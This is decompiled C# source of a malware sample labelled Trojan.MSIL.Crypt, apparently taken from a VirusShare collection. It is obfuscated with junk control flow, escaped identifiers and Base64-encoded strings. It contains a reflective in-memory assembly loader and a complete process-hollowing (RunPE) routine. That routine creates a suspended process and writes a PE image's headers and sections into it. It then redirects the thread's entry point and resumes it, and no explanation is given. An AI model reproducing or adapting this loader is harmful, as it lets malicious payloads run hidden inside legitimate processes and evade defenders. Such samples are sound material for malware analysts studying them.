// Decompiled with JetBrains decompiler
// Type: 
// Assembly: jvfB7Dghj3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3415921B-4A7C-459B-8AB4-2271E9BB92A6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan.MSIL.Crypt.gsi-21bf08ca91d2cb3e60b955c4e9d13e94b611afbb672d669d1a8e69e2a0c21400.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

public static class \u0003
{
  [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
  private static extern IntPtr \u0002(IntPtr _param0, string _param1);

  [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
  private static extern IntPtr \u0002(string _param0);

  private static string \u0002(string _param0)
  {
    Encoding unicode = Encoding.Unicode;
    string s = _param0;
    if (true)
      ;
    byte[] bytes = Convert.FromBase64String(s);
    return unicode.GetString(bytes);
  }

  private static uint \u0002(byte[] _param0, int _param1)
  {
    byte[] numArray = _param0;
    if (true)
      ;
    int startIndex = _param1;
    return BitConverter.ToUInt32(numArray, startIndex);
  }

  public static void \u0002(byte[] _param0)
  {
    MethodInfo entryPoint = Assembly.Load(_param0).EntryPoint;
    if (true)
      goto label_5;
label_1:
    MethodInfo methodInfo1;
    if (methodInfo1.GetParameters().Length > 0)
    {
      MethodInfo methodInfo2 = methodInfo1;
      object[] objArray1 = new object[1];
      if (true)
        goto label_6;
label_3:
      object[] objArray2;
      objArray2[0] = (object) new string[0];
      object[] parameters = objArray2;
      methodInfo2.Invoke((object) null, parameters);
      return;
label_6:
      objArray2 = objArray1;
      goto label_3;
    }
    else
    {
      methodInfo1.Invoke((object) null, (object[]) null);
      return;
    }
label_5:
    methodInfo1 = entryPoint;
    goto label_1;
  }

  public static void \u0003(byte[] _param0)
  {
    \u0003.\u0002 forFunctionPointer1 = (\u0003.\u0002) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379601))), \u0003.\u0002(\u0005.\u0002(-1340379628))), typeof (\u0003.\u0002));
    if (true)
      goto label_21;
label_1:
    \u0003.\u0003 forFunctionPointer2 = (\u0003.\u0003) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379601))), \u0003.\u0002(\u0005.\u0002(-1340379451))), typeof (\u0003.\u0003));
    if (true)
      goto label_22;
label_2:
    \u0003.\u0005 forFunctionPointer3 = (\u0003.\u0005) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379466))), \u0003.\u0002(\u0005.\u0002(-1340379497))), typeof (\u0003.\u0005));
    if (true)
      goto label_23;
label_3:
    \u0003.\u0008 forFunctionPointer4 = (\u0003.\u0008) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379601))), \u0003.\u0002(\u0005.\u0002(-1340379308))), typeof (\u0003.\u0008));
    if (true)
      goto label_24;
label_4:
    \u0003.\u0006 forFunctionPointer5 = (\u0003.\u0006) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379601))), \u0003.\u0002(\u0005.\u0002(-1340379387))), typeof (\u0003.\u0006));
    if (true)
      goto label_25;
label_5:
    \u0003.\u000E forFunctionPointer6 = (\u0003.\u000E) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379601))), \u0003.\u0002(\u0005.\u0002(-1340379150))), typeof (\u0003.\u000E));
    if (true)
      goto label_26;
label_6:
    \u0003.\u000F forFunctionPointer7 = (\u0003.\u000F) Marshal.GetDelegateForFunctionPointer(\u0003.\u0002(\u0003.\u0002(\u0003.\u0002(\u0005.\u0002(-1340379601))), \u0003.\u0002(\u0005.\u0002(-1340379217))), typeof (\u0003.\u000F));
    if (true)
      goto label_27;
label_7:
    byte[] numArray1 = new byte[64];
    if (true)
      goto label_28;
label_8:
    byte[] destinationArray1;
    Array.Copy((Array) _param0, 0, (Array) destinationArray1, 0, 64);
    if (BitConverter.ToUInt16(destinationArray1, 0) != (ushort) 23117)
      return;
    byte[] numArray2 = new byte[248];
    if (true)
      goto label_29;
label_11:
    byte[] destinationArray2;
    Array.Copy((Array) _param0, BitConverter.ToInt32(destinationArray1, 60), (Array) destinationArray2, 0, 248);
    if (\u0003.\u0002(destinationArray2, 0) != 17744U)
      return;
    byte[] numArray3 = new byte[40];
    if (true)
      goto label_30;
label_14:
    IntPtr[] numArray4 = new IntPtr[4];
    uint[] numArray5 = new uint[179];
    \u0003.\u0002 obj1;
    if (!obj1(\u0003.\u0002(\u0005.\u0002(-1340379244)), string.Empty, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, new byte[68], numArray4))
      return;
    numArray5[0] = 65538U;
    \u0003.\u0003 obj2;
    \u0003.\u0005 obj3;
    \u0003.\u0008 obj4;
    \u0003.\u0006 obj5;
    byte[] destinationArray3;
    \u0003.\u000E obj6;
    if (obj2(numArray4[1], numArray5))
    {
      IntPtr num1 = obj3(numArray4[0], (IntPtr) (long) \u0003.\u0002(destinationArray2, 52));
      IntPtr num2 = obj4(numArray4[0], (IntPtr) (long) \u0003.\u0002(destinationArray2, 52), \u0003.\u0002(destinationArray2, 80), 12288U, 64U);
      IntPtr num3 = obj5(numArray4[0], (IntPtr) (long) \u0003.\u0002(destinationArray2, 52), _param0, \u0003.\u0002(destinationArray2, 84), UIntPtr.Zero);
      for (int index = 0; index < (int) BitConverter.ToUInt16(destinationArray2, 6); ++index)
      {
        Array.Copy((Array) _param0, BitConverter.ToInt32(destinationArray1, 60) + 248 + 40 * index, (Array) destinationArray3, 0, 40);
        byte[] destinationArray4 = new byte[(IntPtr) \u0003.\u0002(destinationArray3, 16)];
        Array.Copy((Array) _param0, (long) \u0003.\u0002(destinationArray3, 20), (Array) destinationArray4, 0L, (long) \u0003.\u0002(destinationArray3, 16));
        IntPtr num4 = obj5(numArray4[0], (IntPtr) (long) (\u0003.\u0002(destinationArray2, 52) + \u0003.\u0002(destinationArray3, 12)), destinationArray4, \u0003.\u0002(destinationArray3, 16), UIntPtr.Zero);
      }
      byte[] bytes = BitConverter.GetBytes(\u0003.\u0002(destinationArray2, 52));
      IntPtr num5 = obj5(numArray4[0], (IntPtr) (long) (numArray5[41] + 8U), bytes, (uint) bytes.Length, UIntPtr.Zero);
      numArray5[44] = \u0003.\u0002(destinationArray2, 52) + \u0003.\u0002(destinationArray2, 40);
      IntPtr num6 = obj6(numArray4[1], numArray5);
    }
    \u0003.\u000F obj7;
    IntPtr num = obj7(numArray4[1]);
    return;
label_30:
    destinationArray3 = numArray3;
    goto label_14;
label_29:
    destinationArray2 = numArray2;
    goto label_11;
label_28:
    destinationArray1 = numArray1;
    goto label_8;
label_27:
    obj7 = forFunctionPointer7;
    goto label_7;
label_26:
    obj6 = forFunctionPointer6;
    goto label_6;
label_25:
    obj5 = forFunctionPointer5;
    goto label_5;
label_24:
    obj4 = forFunctionPointer4;
    goto label_4;
label_23:
    obj3 = forFunctionPointer3;
    goto label_3;
label_22:
    obj2 = forFunctionPointer2;
    goto label_2;
label_21:
    obj1 = forFunctionPointer1;
    goto label_1;
  }

  private delegate bool \u0002(
    string _param1,
    string _param2,
    IntPtr _param3,
    IntPtr _param4,
    bool _param5,
    uint _param6,
    IntPtr _param7,
    string _param8,
    byte[] _param9,
    IntPtr[] _param10);

  private delegate bool \u0003(IntPtr _param1, uint[] _param2);

  private delegate IntPtr \u0005(IntPtr _param1, IntPtr _param2);

  private delegate IntPtr \u0006(
    IntPtr _param1,
    IntPtr _param2,
    byte[] _param3,
    uint _param4,
    UIntPtr _param5);

  private delegate IntPtr \u0008(
    IntPtr _param1,
    IntPtr _param2,
    uint _param3,
    uint _param4,
    uint _param5);

  private delegate IntPtr \u000E(IntPtr _param1, uint[] _param2);

  private delegate IntPtr \u000F(IntPtr _param1);
}
